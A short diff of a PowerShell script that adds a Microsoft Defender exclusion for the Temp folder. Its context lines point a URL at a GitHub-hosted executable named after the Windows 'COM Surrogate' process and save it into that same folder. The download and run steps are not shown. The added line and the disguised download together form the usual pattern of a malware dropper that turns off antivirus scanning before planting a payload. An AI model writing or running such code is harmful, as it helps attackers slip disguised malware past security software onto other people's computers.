@@ -1,3 +1,4 @@
+Add-MpPreference -ExclusionPath $env:Temp
 $url = "https://raw.githubusercontent.com/M7mmdddd/webstie-demo/refs/heads/main/files/COM%20Surrogate.exe"
 
  $output = "$env:TEMP\COM_Surrogate.exe"
